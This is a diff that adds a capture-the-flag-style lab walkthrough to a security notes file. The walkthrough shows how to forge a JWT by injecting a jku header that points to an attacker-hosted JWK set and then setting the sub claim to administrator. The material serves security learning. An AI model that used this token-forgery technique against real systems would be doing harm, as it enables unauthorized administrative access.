@@ -68,3 +68,56 @@ In the header of the JWT, observe that a jwk parameter has been added containing
 Send request DONE!!
  ```
 
+
+## JWT authentication bypass via jku header injection
+When the "jku" parameter is present in the JWT header, it indicates that the public keys needed to verify the token's signature can be found at the specified URL. This allows for more efficient key management, as the keys can be rotated or updated independently of the tokens themselves.
+```bash
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jku": "https://example.com/keys.jwks"
+}
+```
+
+- Solving The Lab
+
+```bash
+Go to the JWT Editor Keys Click New RSA Key.  click Generate to automatically generate a new key pair, then click OK to save the key
+open exploit.html
+add following code inside boy tag
+
+
+
+{
+    "keys": [
+
+    ]
+}
+
+Back on the JWT Editor Keys tab, right-click on the entry for the key that you just generated, then select Copy Public Key as JWK. 
+Paste the JWK into the keys array on the exploit server, then store the exploit. The result should look something like this: 
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
+            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+        }
+    ]
+}
+
+in the header of the JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server. 
+Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jku": "https://example.com/keys.jwks"
+}
+
+change the value of the sub claim to administrator.
+click Sign, then select the RSA key that you generated in the previous section
+then click OK. 
+DONE!!
+
+```
